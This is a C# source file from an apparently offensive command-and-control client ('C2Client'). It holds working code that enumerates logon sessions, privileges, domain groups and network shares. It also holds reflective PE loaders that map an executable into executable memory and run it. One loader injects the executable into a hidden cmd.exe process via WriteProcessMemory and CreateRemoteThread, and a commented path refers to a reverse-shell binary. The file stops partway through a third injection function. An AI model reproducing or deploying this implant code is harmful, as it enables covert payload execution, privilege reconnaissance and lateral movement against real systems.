using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Collections;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Security.AccessControl;

namespace C2Client
{
   
    public partial class winapi
    {

        public static LSA_UNICODE_STRING stringToLSAUNICODE(string test)
        {

            IntPtr stringptr = Marshal.StringToHGlobalUni(test);
            LSA_UNICODE_STRING lsau = new LSA_UNICODE_STRING();
            lsau.Buffer = stringptr;
            lsau.Length = (ushort)(test.Length * UnicodeEncoding.CharSize);
            lsau.MaximumLength = (ushort)((test.Length + 1) * UnicodeEncoding.CharSize);
            return lsau;
        }


        public static string LSAUNICODEToString(LSA_UNICODE_STRING lsau)
        {
            char[] test = new char[lsau.MaximumLength];
            Marshal.Copy(lsau.Buffer, test, 0, lsau.Length / UnicodeEncoding.CharSize);
            return new string(test);
        }
        public static string Getlogonsessions()
        {
            string output = "";
            UInt64 count = 0;
            StringWriter sw = new StringWriter();

            IntPtr luidptr = IntPtr.Zero;
            int res = LsaEnumerateLogonSessions(ref count, ref luidptr);

            if (res == 0)
            {
                //Console.WriteLine(count);

                for (ulong i = 0; i < count; i++)
                {

                    LUID l = (LUID)Marshal.PtrToStructure(luidptr, typeof(LUID));

                    //Console.WriteLine("Low part: {0}",l.LowPart);
                    //Console.WriteLine("High part: {0}",l.HighPart);
                    IntPtr sdata = IntPtr.Zero;
                    int res1 = LsaGetLogonSessionData(luidptr, ref sdata);

                    if (res1 == 0)
                    {
                        SECURITY_LOGON_SESSION_DATA s = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sdata, typeof(SECURITY_LOGON_SESSION_DATA));

                        if (s.UserName.Length > 0)
                        {
                            sw.WriteLine("Username: {0}", LSAUNICODEToString(s.UserName));
                            sw.WriteLine("Domain: {0}", LSAUNICODEToString(s.LoginDomain));
                            sw.WriteLine("Logon server: {0}", LSAUNICODEToString(s.LogonServer));
                        }
                    }

                    LsaFreeReturnBuffer(sdata);
                    luidptr = (IntPtr)luidptr.ToInt64() + Marshal.SizeOf(typeof(LUID));


                }

                LsaFreeReturnBuffer(luidptr);
            }
            sw.WriteLine("Logon sessions count: {0}", count);

            output = sw.ToString();
            return output;
        }

        public static string GetGroupsPrivileges(string computername,string groupname)
        {
            string output = "";
            StringWriter sw = new StringWriter();

            uint mask = (uint)(

            LSA_AccessPolicy.POLICY_LOOKUP_NAMES 

            );
            IntPtr lsahandle = IntPtr.Zero;
            string systemname = null;
            LSA_OBJECT_ATTRIBUTES loa = new LSA_OBJECT_ATTRIBUTES();
            loa.Attributes = 0;
            loa.Length = 0;
            //loa.ObjectName = IntPtr.Zero;
            loa.SecurityDescriptor = IntPtr.Zero;
            loa.RootDirectory = IntPtr.Zero;
            loa.SecurityQualityOfService = IntPtr.Zero;

            int res = LsaOpenPolicy(
                ref systemname,
                ref loa,
                mask,
                ref lsahandle
                );

            Console.WriteLine(lsahandle);

            IntPtr unicodeptr = IntPtr.Zero;
            UInt64 count = 0;
            byte[] sid = null;
            uint cbsize = 0;
            StringBuilder domainname = new StringBuilder();
            uint domainlength = 0;
            int acctype = 0;

            int res2 = LookupAccountNameW(
                computername,
                groupname,
                sid,
                ref cbsize,
                domainname,
                ref domainlength,
                ref acctype
                );

            domainname = new StringBuilder((int)domainlength);
            sid = new byte[cbsize];

            LookupAccountNameW(
                computername,
                groupname,
                sid,
                ref cbsize,
                domainname,
                ref domainlength,
                ref acctype
                );

            
            IntPtr username = IntPtr.Zero;
            ConvertSidToStringSidW(sid, ref username);
            
            sw.WriteLine("Group: {0}, SID: {1}", groupname, Marshal.PtrToStringUni(username));


            int res1 = LsaEnumerateAccountRights(
                lsahandle,
                sid,
                ref unicodeptr,
                ref count
                );
            //Console.WriteLine("res1: {0}", res1);

           // Console.WriteLine("Rights count: {0}", count);

            for (ulong i = 0; i < count; i++)
            {
                LSA_UNICODE_STRING lus = (LSA_UNICODE_STRING)Marshal.PtrToStructure(unicodeptr, typeof(LSA_UNICODE_STRING));

                
                sw.Write(LSAUNICODEToString(lus) + ",");

                unicodeptr = (IntPtr)(unicodeptr.ToInt64() + Marshal.SizeOf(typeof(LSA_UNICODE_STRING)));

            }
            LsaClose(lsahandle);

            sw.WriteLine();
            output = sw.ToString();

            return output;
        }


        public static List<string> GetGroups()
        {
            List<string> groups = new List<string>();


            try
            {

                Forest f = Forest.GetCurrentForest();
                DomainCollection domains = f.Domains;
                foreach (Domain d in domains)
                {
                    string domainName = d.Name.ToString();
                    string[] dcs = domainName.Split('.');
                    for (int i = 0; i < dcs.Length; i++)
                    {
                        dcs[i] = "DC=" + dcs[i];

                    }

                    StringWriter sw = new StringWriter();

                    try
                    {
                        // DC=tech69,DC=local,DC=net 
                        DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                        DirectorySearcher ds = new DirectorySearcher();
                        ds.SearchRoot = de;
                        ds.Filter = "(objectclass=group)";
                        foreach (SearchResult sr in ds.FindAll())
                        {
                            groups.Add(sr.Properties["samaccountname"][0].ToString());
                        }

                    }
                    catch { }
                }
            }
            catch { }

            return groups;
        }

        public static string PSIDtoSTRING(byte[] sid)
        {
            IntPtr username = IntPtr.Zero;

            ConvertSidToStringSidW(sid, ref username);
            return Marshal.PtrToStringUni(username);
        }


        public static string GetNetShares(string computername)
        {
            string output = "";
            StringWriter sw = new StringWriter();

            IntPtr bufptr = IntPtr.Zero;
            UInt32 entriesread = 0, totalentries = 0;
            //string computername = Environment.MachineName;
            int result = NetShareEnum(
                computername,
                503,
                ref bufptr,
                1000,
                ref entriesread,
                ref totalentries,
                IntPtr.Zero
                );

            OrderedDictionary SHARE_TYPES = new OrderedDictionary();
            SHARE_TYPES.Add(@"STYPE_SPECIAL- Special share reserved for interprocess communication (IPC$) or remote administration of the server", 2147483648);
            SHARE_TYPES.Add("STYPE_CLUSTER_DFS", 134217728);
            SHARE_TYPES.Add("STYPE_TEMPORARY", 1073741824);
            SHARE_TYPES.Add("STYPE_CLUSTER_SOFS", 67108864);
            SHARE_TYPES.Add("STYPE_CLUSTER_FS", 33554432);
            SHARE_TYPES.Add("STYPE_IPC", 3);
            SHARE_TYPES.Add("STYPE_DEVICE", 2);
            SHARE_TYPES.Add("STYPE_PRINTQ", 1);
            SHARE_TYPES.Add("STYPE_DISKTREE", 0);
            Console.WriteLine("Result is {0}", result);
            Console.WriteLine("Total entries are {0}", totalentries);
            for (int i = 0; i < totalentries; i++)
            {
                SHARE_INFO_503 s2 = (SHARE_INFO_503)Marshal.PtrToStructure(bufptr, typeof(SHARE_INFO_503));

                foreach (DictionaryEntry d in SHARE_TYPES)
                {
                    if (Int64.Parse(s2.shi503_type.ToString()) >= Int64.Parse(d.Value.ToString()))
                    {
                        sw.WriteLine(d.Key.ToString());
                        break;
                    }
                }
                sw.WriteLine("Netname: {0}", s2.shi503_netname);
                sw.WriteLine("Path: {0}", s2.shi503_path);
                sw.WriteLine("Current uses: {0}", s2.shi503_current_uses);
                sw.WriteLine("Remark: {0}", s2.shi503_remark);

                
                try
                {
                    string[] filenames = Directory.GetFiles(String.Format("\\\\{0}\\{1}", computername, s2.shi503_netname));
                    foreach (string filename in filenames)
                    {
                        sw.WriteLine("File: {0}", filename);
                    }
                    sw.WriteLine();
                }
                catch { }

                bufptr += Marshal.SizeOf(typeof(SHARE_INFO_503));
            }
            output = sw.ToString();

            return output;

        }


        
        public static string CheckBitVersion(byte[] rawfile)
        {
            string bit32 = "32bit";
            string bit64 = "64bit";

            
            byte[] dos = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
           
            byte[] lfanew = new byte[4];
            for (int i = 0; i < 4; i++)
            {
                //Console.WriteLine(  dos[60 + i].ToString("X"));
                lfanew[i] = rawfile[60 + i];
            }

            int peheaderoffset = BitConverter.ToInt32(lfanew, 0);
            

            byte[] bitversion = new byte[2];
            bitversion[0] = rawfile[peheaderoffset + 4 + 20];
            bitversion[1] = rawfile[peheaderoffset + 4 + 20+ 1];

            string value = BitConverter.ToString(bitversion);
            if (value == "0B-01")
            {
                return bit32;
            }
            else if (value == "0B-02")
            {
                return bit64;
            }
            return bit32;

        }


        public static int GetSizeofHeaders(byte[] rawfile)
        {
            int size = 0;

            byte[] lfanew = new byte[4];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = rawfile[i + 60];
                //Console.WriteLine(lfanew[i].ToString("X2"));
            }

            int peoffset = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(peoffset);

            int sizeofheadersoffset = peoffset + 84;

            byte[] headerssize = new byte[4];
            for (int i = 0; i < headerssize.Length; i++)
            {
                headerssize[i] = rawfile[sizeofheadersoffset + i];
            }

            size = BitConverter.ToInt32(headerssize, 0);

            return size;
        }


        public static int GetImageSize(byte[] rawfile)
        {
            int size = 0;

            byte[] lfanew = new byte[4];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = rawfile[i + 60];
                //Console.WriteLine(lfanew[i].ToString("X2"));
            }

            int peoffset = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(peoffset);

            int sizeofheadersoffset = peoffset + 80;

            byte[] headerssize = new byte[4];
            for (int i = 0; i < headerssize.Length; i++)
            {
                headerssize[i] = rawfile[sizeofheadersoffset + i];
            }

            size = BitConverter.ToInt32(headerssize, 0);

            return size;
        }


        public static void LoadPE64(byte[] rawfile)
        {
            /*
              * #define IMAGE_ORDINAL_FLAG64 0x8000000000000000
                 #define IMAGE_ORDINAL_FLAG32 0x80000000
                 #define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                 #define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)
                 #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
                 #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
              */

            try
            {
                

                string bit = CheckBitVersion(rawfile);

                Console.WriteLine(bit);

                if (bit != "64bit")
                {
                    Environment.Exit(0);
                }



                int headerssize = GetSizeofHeaders(rawfile);

                int imagesize = GetImageSize(rawfile);


                IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, imagesize, 0x00001000, 0x40);

                Console.WriteLine("Memory allocated at: {0}", baseaddress.ToString("X2"));


                Marshal.Copy(rawfile, 0, baseaddress, headerssize);



                #region parsingheaders and mapping sections
                // parsing headers

                IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));

                IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();

                ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);

                ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 4, typeof(IMAGE_FILE_HEADER));

                ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 24, typeof(IMAGE_OPTIONAL_HEADER64));

                Console.WriteLine(ntheader.OptionalHeader.ImageBase.ToString("X2"));
                Console.WriteLine(ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X2"));

                IMAGE_SECTION_HEADER[] sh = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];

                for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
                {

                    sh[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((baseaddress + dosheader.e_lfanew + 24 + Marshal.SizeOf(ntheader.OptionalHeader)) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));
                    Console.WriteLine("Name: {0}", new string(sh[i].Name));
                    Console.WriteLine("Virtual Address: {0}", sh[i].VirtualAddress.ToString("X"));
                    Console.WriteLine("Raw offset: {0}", sh[i].PointerToRawData.ToString("X"));
                    Console.WriteLine("Size of raw data: {0}", sh[i].SizeOfRawData.ToString("X"));
                    Console.WriteLine("Virtual Size: {0}", sh[i].VirtualSize.ToString("X"));
                }

                // mapping sections to memory
                for (int i = 0; i < sh.Length; i++)
                {
                    if (sh[i].SizeOfRawData > 0)
                    {
                        uint rawoffset = sh[i].PointerToRawData;
                        Console.WriteLine(rawoffset.ToString("X"));
                        byte[] temp = new byte[sh[i].VirtualSize];

                        for (int j = 0; j < temp.Length; j++)
                        {
                            temp[j] = rawfile[j + sh[i].PointerToRawData];
                            //Console.Write(temp[j].ToString("X")+",");
                        }
                        // Console.WriteLine((baseaddress + (int)sh[i].VirtualAddress).ToString("X"));
                        Marshal.Copy(temp, 0, baseaddress + (int)sh[i].VirtualAddress, temp.Length);
                    }
                }


                #endregion


                List<IntPtr> handles = new List<IntPtr>();

                #region Fixing IATs
                //Console.WriteLine("import directory size: {0}", ntheader.OptionalHeader.ImportTable.Size);
                // fix IAT's only if import directory is not zero
                if (ntheader.OptionalHeader.ImportTable.Size > 0)
                {
                    IntPtr importptr = (IntPtr)baseaddress + (int)ntheader.OptionalHeader.ImportTable.VirtualAddress;


                    IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    while (firstimport.Name != 0)
                    {

                        string dllname = Marshal.PtrToStringAnsi(baseaddress + (int)firstimport.Name);
                        Console.WriteLine("Dll name: {0}", dllname);

                        IntPtr dllhandle = LoadLibrary(dllname);

                        Console.WriteLine(GetLastError());
                        int errorcode = GetLastError();

                        IntPtr originalfirstthunk = baseaddress + (int)firstimport.OriginalFirstThunk;

                        IntPtr firstthunkptr = baseaddress + (int)firstimport.FirstThunk;

                        //IMAGE_THUNK_DATA64 firstthunk = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(firstthunkptr, typeof(IMAGE_THUNK_DATA64));
                        IMAGE_THUNK_DATA64 thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        while (thunk1.Function != 0)
                        {
                            IntPtr name1 = baseaddress + (int)thunk1.Function;

                            string functionname = Marshal.PtrToStringAnsi(name1 + 2);
                            Console.WriteLine(functionname);

                            if (errorcode == 0)
                            {
                                IntPtr functionaddress = GetProcAddress(dllhandle, functionname);
                                if (GetLastError() == 0)
                                {
                                    handles.Add(dllhandle);
                                    Console.WriteLine("Function address: {0}", functionaddress.ToString("X"));

                                    Marshal.WriteInt64(firstthunkptr, functionaddress.ToInt64());

                                }
                            }
                            originalfirstthunk += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA64));
                            thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        }
                        firstthunkptr += 4;
                        importptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                        firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));



                    }
                }
                #endregion



                #region fixing base relocations

                ulong delta = ((ulong)baseaddress.ToInt64()) - ntheader.OptionalHeader.ImageBase;

                Console.WriteLine("Expected ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
                Console.WriteLine("Loaded ImageBase: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Delta: {0}", delta.ToString("X"));

                IntPtr firstreloc = baseaddress + (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress;
                uint allrelocsize = ntheader.OptionalHeader.BaseRelocationTable.Size;

                IMAGE_BASE_RELOCATION reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                while (reloc1.pagerva != 0)
                {

                    Console.WriteLine("RVA: {0}", reloc1.pagerva.ToString("X"));
                    Console.WriteLine("size: {0}", reloc1.size.ToString("X"));

                    int entries = ((int)reloc1.size - 8) / 2;

                    Console.WriteLine("Number of entries: {0}", entries.ToString("X"));

                    for (int i = 0; i < entries; i++)
                    {
                        short offset = Marshal.ReadInt16((firstreloc + 8) + (i * 2));

                        if (offset.ToString("X")[0] == 'A')
                        {
                            // IMAGE_REL_BASED_DIR64 10

                            string offset2 = offset.ToString("X").Split('A')[1];

                            Console.WriteLine("Offset: {0}", offset2);

                            byte[] byteoffset2 = Encoding.ASCII.GetBytes(offset2);

                            long temp = Convert.ToInt64(offset2, 16);

                            long fullrva = reloc1.pagerva + temp;
                            Console.WriteLine("Full  RVA: {0}", fullrva.ToString("X"));

                            long value = Marshal.ReadInt64((IntPtr)(baseaddress.ToInt64() + fullrva));
                            Console.WriteLine("TO BE RELOCATED VALUE: {0}", value.ToString("X"));

                            ulong updatedvalue = (ulong)value + delta;
                            Console.WriteLine("updated value: {0}", updatedvalue.ToString("X"));
                            Marshal.WriteInt64((IntPtr)(baseaddress.ToInt64() + fullrva), (long)updatedvalue);

                        }

                    }

                    firstreloc += (int)reloc1.size;
                    reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                }

                #endregion

                try
                {
                    Console.WriteLine((baseaddress + (int)ntheader.OptionalHeader.AddressOfEntryPoint).ToString("X"));
                    IntPtr threadhandle = IntPtr.Zero;
                    uint threadid = 0;
                    threadhandle = CreateThread(IntPtr.Zero,
                       (uint)ntheader.OptionalHeader.SizeOfStackCommit,
                       baseaddress + (int)ntheader.OptionalHeader.AddressOfEntryPoint,
                       IntPtr.Zero,
                       0,
                       ref threadid
                        );


                    Console.WriteLine("Thread id: {0}", threadid);
                    Console.WriteLine(GetLastError());

                    WaitForSingleObject(threadhandle, 0xFFFFFFFF);

                    CloseHandle(threadhandle);

                }
                catch { }
                foreach (var i in handles)
                {
                    FreeLibrary(i);
                }

                VirtualFree(baseaddress, 0, 0x00008000);
                //Environment.Exit(0);
                // Console.ReadKey();

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            // Console.ReadKey();
        }


        public static void InjectPE64(byte[] rawfile)
        {
            /*
              * #define IMAGE_ORDINAL_FLAG64 0x8000000000000000
                 #define IMAGE_ORDINAL_FLAG32 0x80000000
                 #define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                 #define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)
                 #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
                 #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
              */
           // string exe_path = @"D:\red teaming tools\revshell.exe";
          //  byte[] rawfile = File.ReadAllBytes(exe_path);

            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(@"C:\Windows\System32\cmd.exe");
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();

            IntPtr prochandle = p.Handle;



            //p.Kill();



            try
            {


                string bit = CheckBitVersion(rawfile);

                Console.WriteLine(bit);

                if (bit != "64bit")
                {
                    Environment.Exit(0);
                }



                int headerssize = GetSizeofHeaders(rawfile);

                int imagesize = GetImageSize(rawfile);

                IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, imagesize, 0x00001000, 0x40);
                Marshal.Copy(rawfile, 0, baseaddress, headerssize);

                IntPtr remotebaseaddress = VirtualAllocEx(prochandle, IntPtr.Zero, (uint)imagesize, 0x00001000, 0x40);

                uint oldprotect = 0;
                VirtualProtectEx(prochandle, remotebaseaddress, (uint)imagesize, 0x40, ref oldprotect);

                Console.WriteLine("Local base address: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Memory allocated at: {0}", remotebaseaddress.ToString("X2"));
                Console.WriteLine("Imagesize: {0}", imagesize.ToString("X"));


                #region parsing headers

                IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));

                IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();

                ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);

                ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 4, typeof(IMAGE_FILE_HEADER));

                ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 24, typeof(IMAGE_OPTIONAL_HEADER64));

                Console.WriteLine(ntheader.OptionalHeader.ImageBase.ToString("X2"));
                Console.WriteLine(ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X2"));

                IMAGE_SECTION_HEADER[] sh = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];

                for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
                {

                    sh[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((baseaddress + dosheader.e_lfanew + 24 + Marshal.SizeOf(ntheader.OptionalHeader)) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));
                    Console.WriteLine("Name: {0}", new string(sh[i].Name));
                    Console.WriteLine("Virtual Address: {0}", sh[i].VirtualAddress.ToString("X"));
                    Console.WriteLine("Raw offset: {0}", sh[i].PointerToRawData.ToString("X"));
                    Console.WriteLine("Size of raw data: {0}", sh[i].SizeOfRawData.ToString("X"));
                    Console.WriteLine("Virtual Size: {0}", sh[i].VirtualSize.ToString("X"));
                }


                #endregion

                byte[] headers = new byte[headerssize];
                Marshal.Copy(baseaddress, headers, 0, headers.Length);

                uint byteswritten = 0;
                WriteProcessMemory(prochandle, remotebaseaddress, headers, headers.Length, ref byteswritten);

                Console.WriteLine("Headers size written: {0}", byteswritten.ToString("X"));


                //mapping sections into remote memory

                for (int i = 0; i < sh.Length; i++)
                {
                    if (sh[i].SizeOfRawData > 0)
                    {
                        uint rawoffset = sh[i].PointerToRawData;
                        Console.WriteLine(rawoffset.ToString("X"));
                        byte[] temp = new byte[sh[i].VirtualSize];

                        for (int j = 0; j < temp.Length; j++)
                        {
                            temp[j] = rawfile[j + sh[i].PointerToRawData];
                            //Console.Write(temp[j].ToString("X")+",");
                        }
                        // Console.WriteLine((baseaddress + (int)sh[i].VirtualAddress).ToString("X"));
                        byteswritten = 0;
                        WriteProcessMemory(prochandle, remotebaseaddress + (int)sh[i].VirtualAddress, temp, temp.Length, ref byteswritten);
                        Console.WriteLine("section {0} with size {1} written", new string(sh[i].Name), byteswritten.ToString("X"));
                    }
                }

                List<IntPtr> handles = new List<IntPtr>();

                #region Fixing IATs
                //Console.WriteLine("import directory size: {0}", ntheader.OptionalHeader.ImportTable.Size);
                // fix IAT's only if import directory is not zero
                if (ntheader.OptionalHeader.ImportTable.Size > 0)
                {
                    IntPtr importptr = (IntPtr)baseaddress + (int)ntheader.OptionalHeader.ImportTable.VirtualAddress;



                    IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    while (firstimport.Name != 0)
                    {

                        string dllname = Marshal.PtrToStringAnsi(baseaddress + (int)firstimport.Name);
                        Console.WriteLine("Dll name: {0}", dllname);

                        IntPtr dllhandle = LoadLibrary(dllname);



                        Console.WriteLine(GetLastError());
                        int errorcode = GetLastError();

                        IntPtr originalfirstthunk = baseaddress + (int)firstimport.OriginalFirstThunk;

                        IntPtr firstthunkptr = baseaddress + (int)firstimport.FirstThunk;

                        IntPtr remotefirstthunk = remotebaseaddress + (int)firstimport.FirstThunk;

                        //IMAGE_THUNK_DATA64 firstthunk = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(firstthunkptr, typeof(IMAGE_THUNK_DATA64));
                        IMAGE_THUNK_DATA64 thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        while (thunk1.Function != 0)
                        {
                            IntPtr name1 = baseaddress + (int)thunk1.Function;

                            string functionname = Marshal.PtrToStringAnsi(name1 + 2);
                            Console.WriteLine(functionname);

                            if (errorcode == 0)
                            {
                                IntPtr functionaddress = GetProcAddress(dllhandle, functionname);
                                if (GetLastError() == 0)
                                {
                                    handles.Add(dllhandle);
                                    Console.WriteLine("Function address: {0}", functionaddress.ToString("X"));

                                    Marshal.WriteInt64(firstthunkptr, functionaddress.ToInt64());

                                    byteswritten = 0;
                                    byte[] functionvalue = BitConverter.GetBytes(functionaddress.ToInt64());
                                    WriteProcessMemory(prochandle,
                                        remotefirstthunk,
                                        functionvalue,
                                        functionvalue.Length,
                                        ref byteswritten
                                        );

                                }
                            }
                            originalfirstthunk += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA64));
                            thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        }
                        firstthunkptr += 4;
                        remotefirstthunk += 4;

                        importptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                        firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    }
                }
                #endregion



                #region fixing base relocations

                ulong delta = ((ulong)remotebaseaddress.ToInt64()) - ntheader.OptionalHeader.ImageBase;

                Console.WriteLine("Expected ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
                Console.WriteLine("Loaded ImageBase: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Delta: {0}", delta.ToString("X"));

                IntPtr firstreloc = baseaddress + (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress;
                uint allrelocsize = ntheader.OptionalHeader.BaseRelocationTable.Size;

                IMAGE_BASE_RELOCATION reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                while (reloc1.pagerva != 0)
                {

                    Console.WriteLine("RVA: {0}", reloc1.pagerva.ToString("X"));
                    Console.WriteLine("size: {0}", reloc1.size.ToString("X"));

                    int entries = ((int)reloc1.size - 8) / 2;

                    Console.WriteLine("Number of entries: {0}", entries.ToString("X"));

                    for (int i = 0; i < entries; i++)
                    {
                        int offset = Marshal.ReadInt16((firstreloc + 8) + (i * 2));
                        offset = (offset & 0xffff);
                        string temp2 = offset.ToString("X");
                        if (temp2[0] == 'A')
                        {
                            // IMAGE_REL_BASED_DIR64 10
                            
                            
                            temp2 = temp2.Remove(0, 1);
                            string offset2 = temp2;

                            Console.WriteLine("Offset: {0}", offset2);

                            byte[] byteoffset2 = Encoding.ASCII.GetBytes(offset2);

                            long temp = Convert.ToInt64(offset2, 16);

                            long fullrva = reloc1.pagerva + temp;
                            Console.WriteLine("Full  RVA: {0}", fullrva.ToString("X"));

                            long value = Marshal.ReadInt64((IntPtr)(baseaddress.ToInt64() + fullrva));
                            Console.WriteLine("TO BE RELOCATED VALUE: {0}", value.ToString("X"));

                            ulong updatedvalue = (ulong)value + delta;
                            Console.WriteLine("updated value: {0}", updatedvalue.ToString("X"));
                            Marshal.WriteInt64((IntPtr)(baseaddress.ToInt64() + fullrva), (long)updatedvalue);

                            byte[] latestvalue = BitConverter.GetBytes(updatedvalue);

                            byteswritten = 0;
                            WriteProcessMemory(prochandle, (IntPtr)(remotebaseaddress.ToInt64() + fullrva), latestvalue, latestvalue.Length, ref byteswritten);
                        }

                    }

                    firstreloc += (int)reloc1.size;
                    reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                }

                #endregion




                uint threadid = 0;
                IntPtr threadhandle = CreateRemoteThread(
                    prochandle,
                    IntPtr.Zero,
                   (uint)ntheader.OptionalHeader.SizeOfStackCommit,
                    remotebaseaddress + (int)ntheader.OptionalHeader.AddressOfEntryPoint,
                    IntPtr.Zero,
                    0,
                    ref threadid
                    );
                Console.WriteLine("last error: {0}", GetLastError());
                Console.WriteLine("Thread ID: {0}", threadid);

                foreach (var i in handles)
                {
                    FreeLibrary(i);
                }

                VirtualFree(baseaddress, 0, 0x00008000);

                //p.Kill();
                


            }
            catch { }


            // Console.ReadKey();
        }



        public static void RemoteInjectPE64(byte[] rawfile,IntPtr prochandle)
        {
            /*
              * #define IMAGE_ORDINAL_FLAG64 0x8000000000000000
                 #define IMAGE_ORDINAL_FLAG32 0x80000000
                 #define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                 #define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)
                 #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
                 #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
              */
            // string exe_path = @"D:\red teaming tools\revshell.exe";
            //  byte[] rawfile = File.ReadAllBytes(exe_path);

           /* Process p = new Process();
            p.StartInfo = new ProcessStartInfo(@"C:\Windows\System32\cmd.exe");
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();*/

            //IntPtr prochandle = prochandle;



            //p.Kill();



            try
            {


                string bit = CheckBitVersion(rawfile);

                Console.WriteLine(bit);

